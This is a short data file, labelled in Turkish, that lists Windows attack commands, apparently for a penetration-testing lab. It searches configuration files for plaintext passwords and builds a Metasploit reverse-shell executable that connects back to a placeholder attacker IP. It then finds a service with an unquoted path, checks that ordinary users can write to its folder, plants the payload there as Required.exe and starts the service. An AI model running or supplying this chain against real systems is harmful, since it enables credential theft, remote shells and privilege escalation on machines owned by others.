commands.name: Dosyalarda Parola Arama
commands.command:
cd "C:\Program Files"
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String "password" -List | select path | where path -like "*.conf"
commands.description: Program Files dizininde .conf uzantılı dosyalarda 'password' kelimesini arar
commands.notes: Konfigürasyon dosyalarında saklanan düz metin parolaları bulur

commands.name: Reverse Shell Oluşturma
commands.command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ADDRESI> LPORT=4343 -f exe -o reverse.exe
commands.description: Metasploit ile Windows reverse shell payload'u oluşturur
commands.notes: IP adresi ve port numarası belirtilmelidir

commands.name: Unquoted Service Path
commands.command: Get-WmiObject win32_service | ?{$_.Name -like '*svcunquoted*'} | select Name, DisplayName, State, PathName

commands.name: Dizin Yazma İzni Kontrolü
commands.command: get-acl 'C:\Program Files\Unquoted Service' | ForEach-Object Access | where identityreference -eq 'BUILTIN\Users'
commands.description: Belirtilen dizin için kullanıcı yazma izinlerini kontrol eder

commands.name: Unquoted Service Sömürüsü
commands.command:
cp C:\Users\user\Desktop\reverse.exe 'C:\Program Files\Unquoted Service\Required.exe'
start-service svcunquoted
commands.description: Unquoted service path zafiyetini sömürerek payload çalıştırır
